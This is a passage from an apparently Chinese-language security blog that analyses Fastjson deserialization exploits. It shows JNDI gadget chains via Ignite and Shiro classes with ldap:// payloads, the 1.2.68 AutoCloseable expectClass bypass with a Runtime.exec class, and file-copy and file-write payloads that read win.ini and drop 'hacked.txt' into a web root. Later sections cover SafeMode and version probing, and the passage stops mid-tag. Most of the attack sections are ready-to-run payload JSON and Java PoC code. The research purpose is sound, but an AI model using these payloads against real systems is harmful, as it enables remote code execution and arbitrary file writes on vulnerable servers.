class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ignite<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ignite-jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.transaction<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jta<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.ignite/ignite-core --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.ignite<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ignite-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.8.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>代码示例：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">liuqi_banben</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:9999/BXcEBBgx\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031930659.png" alt="image-20240903193000515"></p><p>利用链分析：</p><p>根据poc来看看漏洞点</p><p><img src="https://cdn.clown2024.cn/202409031938377.png" alt="image-20240903193814261"></p><p><img src="https://cdn.clown2024.cn/202409031938851.png" alt="image-20240903193827745"></p><p>所以就是从jndiNames遍历，然后在getTm方法中触发jndi漏洞，这里的tm属性只有get方法</p><p>但是根据他的返回值看起来并不满足我们前面说的触发get方法的特征，这里就涉及到Fastjson的循环引用</p><p><strong>循环引用</strong></p><p><a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8</a></p><p>fastjson支持循环引用，并且是缺省打开的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//引用可以自己关闭，关闭后可能导致json数据传输的时候丢失<br>//全局配置关闭<br>JSON.DEFAULT_GENERATE_FEATURE |= SerializerFeature.DisableCircularReferenceDetect.getMask();<br>//非全局关闭<br>JSON.toJSONString(obj, SerializerFeature.DisableCircularReferenceDetect);<br></code></pre></td></tr></table></figure><table><thead><tr><th>语法</th><th>描述</th></tr></thead><tbody><tr><td>{“$ref”:”$”}</td><td>引用根对象</td></tr><tr><td>{“$ref”:”@”}</td><td>引用自己</td></tr><tr><td>{“$ref”:”..”}</td><td>引用父对象</td></tr><tr><td>{“$ref”:”..&#x2F;..”}</td><td>引用父对象的父对象</td></tr><tr><td>{“$ref”:”$.members[0].reportTo”}</td><td>基于路径的引用</td></tr></tbody></table><p><code>$ref</code>即循环引用：当一个对象包含另一个对象时，Fastjson就会把该对象解析成引用。引用是通过<code>$ref</code>标示的。</p><p>所以这里poc后面的{“$ref”:”$.tm”}就是基于路径引用，相当于调用了根对象的tm属性，自然就要调用get方法，这里的根对象就是CacheJndiTmLookup</p><p><strong>org.apache.shiro.jndi.JndiObjectFactory</strong></p><p>需要shiro-core和slf4j-api依赖</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;,&quot;instance&quot;:&#123;&quot;$ref&quot;:&quot;$.instance&quot;&#125;&#125;<br></code></pre></td></tr></table></figure><p>代码示例：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">liuqi_banben</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload2=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://127.0.0.1:9999/BXcEBBgx\&quot;,\&quot;instance\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.instance\&quot;&#125;&#125;&quot;</span>;<br>        JSON.parse(payload2);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031934084.png" alt="image-20240903193341386"></p><p><strong>利用链分析</strong></p><p><img src="https://cdn.clown2024.cn/202409032004058.png" alt="image-20240903200449945"></p><p><img src="https://cdn.clown2024.cn/202409032004849.png" alt="image-20240903200455729"></p><p>这里就同理，该类也是只有getInstance方法，然后利用循环引用然后调用到get方法触发jndi漏洞</p><h2 id="fastjson1268"><a href="#Fastjson1-2-68" class="headerlink" title="Fastjson1.2.68"></a>Fastjson1.2.68</h2><p>这次是利用expectClass来绕过checkAutoType函数，大体思路如下：</p><ol><li>先传入某个类，其加载成功后将作为expectClass参数传入checkAutoType()函数；</li><li>查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或setter方法中存在危险操作则可以被攻击利用；</li></ol><p>利用条件：</p><ul><li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中；</li></ul><p>这里先展示攻击流程</p><p>假设Fastjson服务端存在如下实现AutoCloseable接口类的恶意类VulAutoCloseable：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulAutoCloseable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AutoCloseable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">VulAutoCloseable</span><span class="hljs-params">(String cmd)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>poc如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;vul.VulAutoCloseable&quot;,&quot;cmd&quot;:&quot;calc&quot;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-comment">//fastjson1.2.68</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AutoType_RaoGuo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.clown.vul.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031446394.png" alt="image-20240903144639232"></p><p>可以看到没有开启autoTypeSupport也能够成功</p><p>直接从checkAutoType函数开始调试</p><p><img src="https://cdn.clown2024.cn/202409031453120.png" alt="image-20240903145345998"></p><p>到这里可以直接可以从缓存中获取到AutoCloseable这个类</p><p><img src="https://cdn.clown2024.cn/202409031502045.png" alt="image-20240903150200931"></p><p>然后往下直接return了，因为这时候expectClass还是空的</p><p><img src="https://cdn.clown2024.cn/202409031532444.png" alt="image-20240903153245307"></p><p>然后传进去AutoCloseable反序列化，继续跟进</p><p><img src="https://cdn.clown2024.cn/202409031542039.png" alt="image-20240903154215912"></p><p>到这里获取反序列化器为空，然后typeName为我们的实现类，expectClass传递的是AutoCloseable类，继续跟进checkAutoType函数</p><p><img src="https://cdn.clown2024.cn/202409031554161.png" alt="image-20240903155427045"></p><p>到这里expectClassFlag就为true了</p><p><img src="https://cdn.clown2024.cn/202409031557163.png" alt="image-20240903155741275"></p><p>最后走到这个地方，expectClassFlag使判断为true，最终进行loadClass</p><p><img src="https://cdn.clown2024.cn/202409031604442.png" alt="image-20240903160414341"></p><p>然后往下有对加载的类进行判断，这些都是常见的jndi利用链的类，如果属于这些类或者子类直接抛出异常</p><p><img src="https://cdn.clown2024.cn/202409031602941.png" alt="image-20240903160225818"></p><p>往下还有一个加入缓存，然后return，这里还判断了我们的clazz是否为expectClass的子类，所以恶意类必须要继承expectClass</p><p>然后就是反序列化触发构造函数弹计算器</p><blockquote><p>不过这里不过get或者set直接构造函数也可以了，在早期版本我试了一下只能默认构造方法，不过如果存在默认构造方法也是优先默认构造方法</p></blockquote><h3 id="实战利用"><a href="#实战利用" class="headerlink" title="实战利用"></a>实战利用</h3><p>实战中要去找实际可行的利用类，也就是继承了autoCloaseable类的，主要是寻找关于输入输出流的类来写文件，IntputStream和OutputStream都是实现自AutoCloseable接口的。</p><p>寻找gadget的条件可以参考这样：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">需要一个通过 set 方法或构造方法指定文件路径的 OutputStream<br>需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，参数类型必须是byte[]、ByteBuffer、String、char[]其中的一个，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream<br>需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 close、write 或 flush 方法<br>以上三个组合在一起就能构造成一个写文件的利用链，我通过扫描了一下 JDK ，找到了符合第一个和第三个条件的类。<br></code></pre></td></tr></table></figure><p>下面是一些利用payload</p><p><strong>复制文件</strong></p><p>利用类：<strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong></p><p>利用依赖：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>去看一下SafeFileOutputStream的源码：</p><p><img src="https://cdn.clown2024.cn/202409031659197.png" alt="image-20240903165946075"></p><p>该构造函数判断如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中</p><p>利用PoC：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;C:/Windows/win.ini&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;D:/win.txt&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.File_Use;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">File_Move</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;, \&quot;tempPath\&quot;:\&quot;C:/Windows/win.ini\&quot;, \&quot;targetPath\&quot;:\&quot;D:/win.txt\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409031704660.png" alt="image-20240903170451492"></p><p><strong>文件写入</strong></p><p>写内容类：<strong>com.esotericsoftware.kryo.io.Output</strong></p><p>依赖：</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.esotericsoftware<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kryo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Output类主要用来写内容，它提供了setBuffer()和setOutputStream()两个setter方法可以用来写入输入流，其中buffer参数值是文件内容，outputStream参数值就是前面的SafeFileOutputStream类对象，而要触发写文件操作则需要调用其flush()函数</p><p>看一下Output类的源码</p><p><img src="https://cdn.clown2024.cn/202409031911793.png" alt="image-20240903191151647"></p><p><img src="https://cdn.clown2024.cn/202409031915040.png" alt="image-20240903191539933"></p><p><img src="https://cdn.clown2024.cn/202409031913515.png" alt="image-20240903191344410"></p><p>所以我们要想办法调用到Output的flush函数</p><p>flush函数可以在调用close函数和require函数时触发</p><p><img src="https://cdn.clown2024.cn/202409032015641.png" alt="image-20240903201552519"></p><p><img src="https://cdn.clown2024.cn/202409032015969.png" alt="image-20240903201535860"></p><p>然后require函数在write相关函数触发</p><p><img src="https://cdn.clown2024.cn/202409032016029.png" alt="image-20240903201620928"></p><p><img src="https://cdn.clown2024.cn/202409032017695.png" alt="image-20240903201703586"></p><p>然后找到JDK的ObjectOutputStream类，其内部类BlockDataOutputStream的构造函数中将OutputStream类型参数赋值给out成员变量，而其setBlockDataMode()函数中调用了drain()函数、drain()函数中又调用了out.write()函数，满足前面的需求</p><blockquote><p>这都咋找的啊😢</p></blockquote><p><img src="https://cdn.clown2024.cn/202409032020430.png" alt="image-20240903202010304"></p><p><img src="https://cdn.clown2024.cn/202409032020708.png" alt="image-20240903202044589"></p><p>然后对于setBlockDataMode()函数的调用，在ObjectOutputStream类的有参构造函数中就存在</p><p><img src="https://cdn.clown2024.cn/202409032023421.png" alt="image-20240903202324306"></p><p>但是Fastjson优先获取的是ObjectOutputStream类的无参构造函数，因此只能找ObjectOutputStream的继承类来触发，然后找到只有有参构造函数的ObjectOutputStream继承类：<strong>com.sleepycat.bind.serial.SerialOutput</strong>，这个类在这个依赖里面</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.sleepycat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>je<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.0.73<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409032027918.png" alt="image-20240903202720784"></p><p>然后这里调用了父类的构造方法，到这里最终满足条件</p><p>poc如下，然后也运用了前面的循环引用技巧</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/hacked.txt&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:/wamp64/www/test.txt&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.esotericsoftware.kryo.io.Output&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;buffer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cHduZWQ=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;outputStream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.stream&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;position&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;close&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sleepycat.bind.serial.SerialOutput&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$.writer&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>但是写入文件有限，有些特殊字符写不了，比如php代码</p><blockquote><p>payload直接抄了，怎么写出来的就不管了（</p></blockquote><p>代码示例：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.File_Use;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">File_Write</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        String payload=<span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;stream\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;targetPath\&quot;: \&quot;D:/hacked.txt\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;tempPath\&quot;: \&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;writer\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.esotericsoftware.kryo.io.Output\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;buffer\&quot;: \&quot;cHduZWQ=\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;outputStream\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            \&quot;$ref\&quot;: \&quot;$.stream\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;position\&quot;: 5\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;close\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.sleepycat.bind.serial.SerialOutput\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;out\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            \&quot;$ref\&quot;: \&quot;$.writer\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409032034460.png" alt="image-20240903203402350"></p><p>buff这里传的是base64之后的数据</p><p><strong>补丁分析</strong></p><p>额额额该版本之后的补丁又是粗暴的给expectClass多加上一些黑名单</p><h2 id="safemode"><a href="#SafeMode" class="headerlink" title="SafeMode"></a>SafeMode</h2><p>在1.2.68之后的版本，在1.2.68版本中，fastjson增加了safeMode的支持。safeMode打开后，完全禁用autoType。</p><p>开启如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">ParserConfig.getGlobalInstance().setSafeMode(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>开启之后直接完全禁用autoType，即@type</p><p><img src="https://cdn.clown2024.cn/202409032040917.png" alt="image-20240903204034792"></p><p>获取是否设置了SafeMode，如果是则直接抛出异常终止运行</p><h1 id="fastjson1280"><a href="#Fastjson1-2-80" class="headerlink" title="Fastjson1.2.80"></a>Fastjson1.2.80</h1><p>1.2.68之后新版本将<code>java.lang.Runnable、java.lang.Readable和java.lang.AutoCloseable</code>加入了黑名单，这里就利用另一个期望类，异常类<code>Throwable</code></p><p>这里就看一下这篇文章就行了：<a href="https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ%EF%BC%8C%E5%9B%A0%E4%B8%BA%E7%9C%8B%E8%B5%B7%E6%9D%A5%E5%BE%88%E9%9A%BE%E6%9C%89rce%E7%9A%84%E7%82%B9%EF%BC%88%E4%B8%BB%E8%A6%81%E6%98%AF%E6%87%92%E4%BA%86%E4%B8%8D%E6%83%B3%E5%86%8D%E5%86%99%E4%BA%86%F0%9F%98%A2">https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ，因为看起来很难有rce的点（主要是懒了不想再写了😢</a></p><h1 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h1><p>平时用于探测fastjson的一些信息来考虑如何利用，参考文章：<a href="https://forum.butian.net/share/2858%EF%BC%8Chttps://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement">https://forum.butian.net/share/2858，https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement</a></p><p>然后使用safe6Sec师傅的复现环境来做测试：<a href="https://github.com/safe6Sec/ShiroAndFastJson">https://github.com/safe6Sec/ShiroAndFastJson</a></p><p>将其中&#x2F;json路由的代码修改一下方便查看解析结果或者解析报错：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/json&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title function_">parse</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> String data)</span> &#123;<br>    <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>    <span class="hljs-keyword">try</span> &#123;<br>        jsonObject.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-number">0</span>);<br>        jsonObject.put(<span class="hljs-string">&quot;message&quot;</span>, String.valueOf(JSON.parse(data)));<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        jsonObject.put(<span class="hljs-string">&quot;status&quot;</span>, -<span class="hljs-number">1</span>);<br>        jsonObject.put(<span class="hljs-string">&quot;error&quot;</span>, e.getMessage());<br>    &#125;<br>    <span class="hljs-keyword">return</span> jsonObject;<br>&#125;<br></code></pre></td></tr></table></figure><p>后面直接向&#x2F;json路由进行post请求即可</p><h2 id="版本探测"><a href="#版本探测" class="headerlink" title="版本探测"></a>版本探测</h2><p>参考文章：<a href="https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement">https://github.com/W01fh4cker/LearnFastjsonVulnFromZero-Improvement</a></p><p><strong>具体版本探测</strong></p><p>参考文章：<a href="https://b1ue.cn/archives/402.html">https://b1ue.cn/archives/402.html</a></p><p>具体原理是JavaBeanDeserializer 类异常的 message 会把当前 fastjson 的版本号输出，所以需要构造出能令这个类抛出异常的错误即可</p><p><img src="https://cdn.clown2024.cn/202409052248218.png" 